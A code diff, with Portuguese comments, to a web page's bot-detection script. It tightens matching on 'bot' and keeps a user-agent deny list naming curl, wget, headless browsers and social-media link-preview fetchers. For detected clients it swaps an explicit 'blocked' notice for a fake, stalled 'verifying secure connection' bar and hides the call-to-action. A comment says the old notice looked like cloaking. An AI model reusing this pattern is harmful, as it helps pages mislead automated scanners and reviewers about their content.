@@ -348,7 +348,11 @@ body::before{
     // pros sistemas de Safe Browsing.
     var allowlist=['adsbot-google','googlebot','google-safety','bingbot'];
     if(allowlist.some(function(p){return ua.indexOf(p)!==-1})) return false;
-    var botPatterns=['bot','crawler','spider','scraper','curl','wget','python','phantomjs','headless','selenium','webdriver','automated','chrome-lighthouse',
+    // "bot" só como palavra isolada (ex.: "Bot/1.0", "my-bot 2.0"). Como substring
+    // solto ele pegava modelos de celular reais (ex.: "CUBOT") que aparecem no UA
+    // do navegador interno do Instagram/Facebook e do Samsung Internet.
+    if(/(^|[^a-z])bot([^a-z]|$)/.test(ua)) return true;
+    var botPatterns=['crawler','spider','scraper','curl','wget','python','phantomjs','headless','selenium','webdriver','automated','chrome-lighthouse',
       'puppeteer','playwright','okhttp','libwww-perl','httpclient','go-http-client','java/','ruby','perl',
       'facebookexternalhit','whatsapp','telegrambot','ahrefsbot','semrushbot','mj12bot','dotbot','petalbot',
       'bytespider','applebot','duckduckbot','yandexbot','baiduspider','slurp','ia_archiver'];
@@ -359,12 +363,12 @@ body::before{
     return false;
   }
 
+  // Bot detectado: nada de mensagem vermelha de "bloqueado" (parece cloaking e,
+  // num falso positivo, deixa o usuário num beco sem saída). A página só fica
+  // parada no primeiro passo, sem liberar o botão.
   if(!_dev && isBotUserAgent()){
-    status.textContent='❌ Acesso bloqueado (Bot detectado)';
-    status.style.color='#ef4444';
-    bar.style.width='0%';
-    bar.style.background='#ef4444';
-    wrap.style.display='none';
+    status.textContent='Verificando conexão segura...';
+    bar.style.width='25%';
     cta.style.display='none';
     return;
   }
